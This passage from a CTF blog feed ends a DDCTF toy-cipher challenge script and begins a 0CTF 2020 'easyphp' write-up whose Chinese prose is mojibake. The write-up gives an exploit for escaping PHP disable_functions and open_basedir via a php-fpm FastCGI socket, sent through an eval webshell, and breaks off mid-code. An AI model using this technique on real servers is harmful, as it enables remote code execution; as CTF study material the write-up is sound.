class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE_BITS, <span class="number">0</span>, -NUM_BITS):</span><br><span class="line">                bits_list.append((block &gt;&gt; (j - NUM_BITS)) &amp; BIT_MASK)</span><br><span class="line">        <span class="keyword">return</span> bits_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bits_list_to_string</span><span class="params">(self, input_bits)</span>:</span></span><br><span class="line">        num_input_bits_per_block = BLOCK_SIZE_BITS / NUM_BITS;</span><br><span class="line">        output_chars = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(input_bits), num_input_bits_per_block):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(num_input_bits_per_block):</span><br><span class="line">                block = block &lt;&lt; NUM_BITS</span><br><span class="line">                block = block | (input_bits[i + j])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">                output_chars.append((block &gt;&gt; ((j - <span class="number">1</span>) * <span class="number">8</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> output_chars])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        boxed = self.sbox0[self.sbox1[self.sbox0[(b &amp; BIT_MASK) ^ self.k0] ^ self.k1] ^ self.k2] ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.ror7(boxed)) &amp; BIT_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        unboxed = self.rol7((b &amp; BIT_MASK)) ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.rsbox0[self.rsbox1[self.rsbox0[unboxed] ^ self.k2] ^ self.k1] ^ self.k0);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad_s = self.pad_string(s)</span><br><span class="line">        bits = self.string_to_bits_list(pad_s)</span><br><span class="line">        <span class="keyword">return</span> self.bits_list_to_string([(self.encrypt_bits(b)) <span class="keyword">for</span> b <span class="keyword">in</span> bits])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        bits = self.string_to_bits_list(s)</span><br><span class="line">        dec = [self.decrypt_bits(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits]</span><br><span class="line">        <span class="keyword">return</span> self.unpad_string(self.bits_list_to_string(dec))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    DIFFERENTECH Cipher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    As you are monitoring your station, you intercepted a hex-encoded encrypted</span></span><br><span class="line"><span class="string">    message, along with its plain text.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    plaintext = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line"><span class="string">    ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line"><span class="string">                  "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line"><span class="string">                  "146146146146").decode('hex')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    You have also previously chanced upon another encrypted message, which you</span></span><br><span class="line"><span class="string">    will need to decrypt.  Taking a look at the algorithm, and past interceptions,</span></span><br><span class="line"><span class="string">    you noticed that the 12-bit numbers:</span></span><br><span class="line"><span class="string">        2684 encrypts to 2568</span></span><br><span class="line"><span class="string">        3599 encrypts to 3185</span></span><br><span class="line"><span class="string">    You realize that you just might be able to break it before lunch!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: GIVE ONE ENCRYPTED FLAG AS PART OF THE QUESTIION AND Try to decrypt</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># find the right SECRET_KEYS</span></span><br><span class="line">    SECRET_KEYS = [<span class="number">3488</span>, <span class="number">2863</span>, <span class="number">726</span>, <span class="number">1886</span>]</span><br><span class="line">    cipher = Cipher(*SECRET_KEYS)</span><br><span class="line"></span><br><span class="line">    test_text = <span class="string">"DDCTF&#123;"</span></span><br><span class="line">    ciphertext = (<span class="string">"8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf"</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment">#test_text = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line">    <span class="comment">#ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line">    <span class="comment">#              "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line">    <span class="comment">#              "146146146146").decode('hex')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'==='</span></span><br><span class="line">    bits = cipher.string_to_bits_list(test_text)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line">    <span class="comment"># print cipher.encrypt_bits(1344)</span></span><br><span class="line">    <span class="comment"># print ciphertext</span></span><br><span class="line">    bits = cipher.string_to_bits_list(ciphertext)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line"></span><br><span class="line">    dec = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bits:</span><br><span class="line">        dec.append(cipher.decrypt_bits(i))</span><br><span class="line">    <span class="keyword">print</span> dec</span><br><span class="line">    <span class="keyword">print</span> cipher.bits_list_to_string(dec)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="comment"># 8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># enc = cipher.encrypt(test_text)</span></span><br><span class="line">    dec = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_text == dec:</span><br><span class="line">        print(<span class="string">"That's right!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Try again!"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»Šå¹´æ”¹äº†èµ›åˆ¶, å¯ä»¥ä¸¤äººç»„é˜Ÿ, æˆ‘è§‰å¾—æ”¹çš„è¿˜æ˜¯ä¸é”™çš„, ç»ˆäºä¸ç”¨ç°åœºè¡¨æ¼”å­¦ä¹ é€†å‘å’Œ pwn äº†, æˆåŠŸå’Œ Ary å¸ˆå‚…æ‰“åˆ°äº†ç¬¬ä¸‰ 233&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="ddctf" scheme="https://rmb122.com/tags/ddctf/"/>
    
  </entry>
  
  <entry>
    <title>TCTF/0CTF 2020 Writeup</title>
    <link href="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/"/>
    <id>https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/</id>
    <published>2020-06-29T11:49:05.000Z</published>
    <updated>2020-07-02T08:07:47.301Z</updated>
    
    <content type="html"><![CDATA[<p>åˆæ˜¯ä¸€å¹´ 0CTF, è¿™æ¬¡ä¸€ä¸ªäººä¸€é˜Ÿå•åˆ·ä¸€æ¬¡, åšå‡ºäº†ä¸¤é¢˜ WEB, å¯æƒœåªè¾“å‡ºäº†ä¸€å¤©, ç¬¬äºŒå¤©è¿˜è¦èµ¶ ddl, è¿˜æ˜¯å¤ªè”¡äº† orz</p><a id="more"></a><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>ç›´æ¥ç»™äº† webshell, çœ‹ phpinfo,  </p><p>disable_functions:<br>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl<br>open_basedir: /var/www/html<br>disable_classes: ReflectionClass<br>Server API:    FPM/FastCGI  </p><p>çœ‹æ ·å­æ˜¯éœ€è¦ rce, æœ‰ disable_functions å’Œ open_basedir çš„é™åˆ¶, è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯ fpm è€Œä¸” fsockopen æ²¡æœ‰é™åˆ¶, å¯ä»¥æƒ³åˆ°ç›´æ¥æ‰“ fcgi, ä¸è¿‡éœ€è¦çŸ¥é“ unix socket çš„è·¯å¾„, è¿™é‡Œå¯ä»¥ç”¨ DirectoryIterator æ¥åˆ—ç›®å½•, ä¸è¿‡è¯•äº†ä¸‹åªèƒ½åˆ—æ ¹ç›®å½•, å…¶ä»–åœ°æ–¹è¿˜æ˜¯ä¼šè¢« open_basedir æ‹¦, æ¯”è¾ƒç¥å¥‡. ä¸è¿‡å¥½åœ¨ fuzz äº†ä¸€ä¸‹, æ˜¯ä¸ªå¸¸è§æœªçŸ¥, åœ¨ <code>unix:///var/run/php-fpm.sock</code>.<br>ä¹‹åå°±ä¸ç”¨å¤šè¯´äº†, ç”¨ PHP_VALUE é‡Œé¢çš„ open_basedir è¦†ç›–æ‰ php.ini é‡Œçš„ open_basedir å³å¯.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_php_code</span><span class="params">(s)</span>:</span></span><br><span class="line">    res = sess.post(<span class="string">'http://pwnable.org:19260/?rh=eval($_POST[a]);'</span>, data=&#123;<span class="string">"a"</span>: s&#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">class AA</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    const VERSION_1            = 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const BEGIN_REQUEST        = 1;</span></span><br><span class="line"><span class="string">    const ABORT_REQUEST        = 2;</span></span><br><span class="line"><span class="string">    const END_REQUEST          = 3;</span></span><br><span class="line"><span class="string">    const PARAMS               = 4;</span></span><br><span class="line"><span class="string">    const STDIN                = 5;</span></span><br><span class="line"><span class="string">    const STDOUT               = 6;</span></span><br><span class="line"><span class="string">    const STDERR               = 7;</span></span><br><span class="line"><span class="string">    const DATA                 = 8;</span></span><br><span class="line"><span class="string">    const GET_VALUES           = 9;</span></span><br><span class="line"><span class="string">    const GET_VALUES_RESULT    = 10;</span></span><br><span class="line"><span class="string">    const UNKNOWN_TYPE         = 11;</span></span><br><span class="line"><span class="string">    const MAXTYPE              = self::UNKNOWN_TYPE;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const RESPONDER            = 1;</span></span><br><span class="line"><span class="string">    const AUTHORIZER           = 2;</span></span><br><span class="line"><span class="string">    const FILTER               = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const REQUEST_COMPLETE     = 0;</span></span><br><span class="line"><span class="string">    const CANT_MPX_CONN        = 1;</span></span><br><span class="line"><span class="string">    const OVERLOADED           = 2;</span></span><br><span class="line"><span class="string">    const UNKNOWN_ROLE         = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const MAX_CONNS            = 'MAX_CONNS';</span></span><br><span class="line"><span class="string">    const MAX_REQS             = 'MAX_REQS';</span></span><br><span class="line"><span class="string">    const MPXS_CONNS           = 'MPXS_CONNS';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const HEADER_LEN           = 8;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Socket</span></span><br><span class="line"><span class="string">     * @var Resource</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_sock = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Host</span></span><br><span class="line"><span class="string">     * @var String</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_host = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Port</span></span><br><span class="line"><span class="string">     * @var Integer</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_port = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Keep Alive</span></span><br><span class="line"><span class="string">     * @var Boolean</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_keepAlive = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Constructor</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $host Host of the FastCGI application</span></span><br><span class="line"><span class="string">     * @param Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_host = $host;</span></span><br><span class="line"><span class="string">        $this-&gt;_port = $port;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="string">     * alive at the end of a request</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function setKeepAlive($b)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_keepAlive = (boolean)$b;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            fclose($this-&gt;_sock);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get the keep alive status</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getKeepAlive()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return $this-&gt;_keepAlive;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function connect()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;_sock = fsockopen($this-&gt;_host);</span></span><br><span class="line"><span class="string">            var_dump($this-&gt;_sock);</span></span><br><span class="line"><span class="string">            if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">                throw new Exception('Unable to connect to FastCGI application');</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build a FastCGI packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Integer $type Type of the packet</span></span><br><span class="line"><span class="string">     * @param String $content Content of the packet</span></span><br><span class="line"><span class="string">     * @param Integer $requestId RequestId</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildPacket($type, $content, $requestId = 1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $clen = strlen($content);</span></span><br><span class="line"><span class="string">        return chr(self::VERSION_1)         /* version */</span></span><br><span class="line"><span class="string">            . chr($type)                    /* type */</span></span><br><span class="line"><span class="string">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span></span><br><span class="line"><span class="string">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span></span><br><span class="line"><span class="string">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span></span><br><span class="line"><span class="string">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* paddingLength */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* reserved */</span></span><br><span class="line"><span class="string">            . $content;                     /* content */</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $name Name</span></span><br><span class="line"><span class="string">     * @param String $value Value</span></span><br><span class="line"><span class="string">     * @return String FastCGI Name value pair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildNvpair($name, $value)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $nlen = strlen($name);</span></span><br><span class="line"><span class="string">        $vlen = strlen($value);</span></span><br><span class="line"><span class="string">        if ($nlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr($nlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($vlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr($vlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        /* nameData &amp; valueData */</span></span><br><span class="line"><span class="string">        return $nvpair . $name . $value;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="string">     * @return array of NVPair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readNvpair($data, $length = null)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $array = array();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($length === null) &#123;</span></span><br><span class="line"><span class="string">            $length = strlen($data);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $p = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        while ($p != $length) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $nlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($nlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $vlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($vlen &gt;= 